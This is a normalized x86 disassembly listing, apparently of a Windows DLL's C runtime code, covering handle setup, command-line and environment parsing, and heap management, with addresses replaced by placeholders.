lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_10008cba
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_1000d394
push ebx
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
mov edi eax
add eax 0x480
cmp edi eax
jae r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push [ esi ]
call sub_10008d46
and [ esi ] 0x0
pop ecx
lea ebx [ edi + 0xc ]
mov eax [ esi ]
add edi 0x24
add eax 0x480
add ebx 0x24
cmp edi eax
jb r-xdata
push ebx
call [ DeleteCriticalSection@IAT ]
cmp [ ebx - 0x4 ] 0x0
je r-xdata
sub_1000d3e8
push ebx
push edi
push 0x2
xor ebx ebx
call sub_1000b7a4
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_1000b805
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_10007fcf
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_10008d46
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_1000d469
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_100098bc
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_10008cba
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_10008c87
pop ecx
push esi
call sub_1000e840
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_10008d46
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_10008cba
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_1000e840
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_1000b3d0
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_10008c87
pop ecx
sub_1000d522
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_100098bc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_1000d5bb
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_10008cba
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_1000d5bb
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_10008c87
pop ecx
sub_1000d5bb
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_1000d76f
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_10008cba
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_10008cba
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_1000a190
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10008d46
pop ecx
mov [ esp + 0x10 ] ebx
sub_1000d8a1
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_1000daf9
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_1000d8dd
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push ebp
mov ebp [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call ebp
push [ rw-data ]
call [ HeapDestroy@IAT ]
pop ebp
pop ebx
retn
mov eax [ rw-data ]
push esi
push edi
mov edi [ VirtualFree@IAT ]
lea esi [ eax + 0xc ]
push 0x4000
push 0x100000
push [ esi ]
call edi
push 0x8000
push 0x0
push [ esi ]
call edi
push [ esi + 0x4 ]
push 0x0
push [ rw-data ]
call ebp
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop edi
pop esi
sub_1000d952
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1000d98b
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_1000d98b
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1000d98b
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_1000e840
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_1000e840
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_1000b3d0
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_1000b3d0
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_1000b3e0
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_1000b3e0
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_1000b3e0
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_1000fb08
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_1000e840
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_10007bc0
add esp 0x10
sub_1000dade
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_1000daf9
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_1000db37
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_1000db62
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_100077a0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_1000de8d
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_1000e247
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1000e196
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_1000e196
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
